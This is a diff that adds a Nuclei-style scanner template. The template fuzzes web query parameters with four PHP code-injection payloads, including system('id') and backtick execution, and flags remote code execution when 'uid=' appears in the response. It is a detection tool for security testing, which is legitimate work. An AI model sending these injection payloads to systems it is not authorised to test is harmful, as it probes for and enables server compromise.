@@ -1,0 +1,31 @@
+id: fuzz-rce-php-injection
+
+info:
+  name: PHP RCE via Code Injection
+  author: openai
+  severity: critical
+  tags: rce,dast,php
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      php_rce:
+        - "<?php system('id'); ?>"
+        - "<?=`id`?>"
+        - "'; system('id'); //"
+        - "';`id`;//"
+
+    fuzzing:
+      - part: query
+        mode: multiple
+        fuzz:
+          - "{{php_rce}}"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
